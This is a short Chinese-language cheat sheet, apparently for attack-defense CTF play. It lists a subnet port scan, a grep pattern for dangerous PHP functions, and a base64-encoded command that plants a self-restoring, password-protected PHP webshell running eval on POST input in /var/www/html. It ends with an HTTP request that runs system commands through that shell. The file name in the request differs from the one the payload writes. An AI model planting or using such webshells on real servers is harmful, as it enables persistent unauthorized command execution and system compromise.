fscan资产扫描命令：
```shell
fscan.exe -h 172.20.10.1/24 -p 22,80,443,8080,9999 -nobr -nopoc
```

快速查找可疑函数命令：
```shell
grep -r -n -P '(eval|assert|system|exec|passthru|shell_exec|popen|proc_open|file_get_contents|fopen|fread|file|readfile|include|require|include_once|require_once)\s*\(|`[^`]+`' .
```

写马命令：
```shell
echo "PD9waHANCmlnbm9yZV91c2VyX2Fib3J0KHRydWUpOw0Kc2V0X3RpbWVfbGltaXQoMCk7DQokZmlsZSA9ICcuLy1nJnQucGhwJzsNCiRjb2RlID0gIjw/cGhwIGlmKG1kNShcJF9HRVRbJ3Bhc3MnXSk9PSc3ZTA3OWU2ZTkyZDJmNjlkMDljYjI4Y2RkYzQzNWQyNScpe0BldmFsKFwkX1BPU1RbJ2NtZCddKTt9Pz4iOw0Kd2hpbGUgKDEpew0KCWlmICghZmlsZV9leGlzdHMoJGZpbGUpKSB7DQoJCWZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlLCRjb2RlKTsNCgl9DQoJdXNsZWVwKDEwKTsNCgl1bmxpbmsoX19GSUxFX18pOw0KfQ0KDQo/Pg==" | base64 -d > /var/www/html/-g&t.php
```

木马连接方式：
```http request
POST /-gg&tt.php?pass=ljl HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

cmd={{urlencode(system('ls');)}}
```
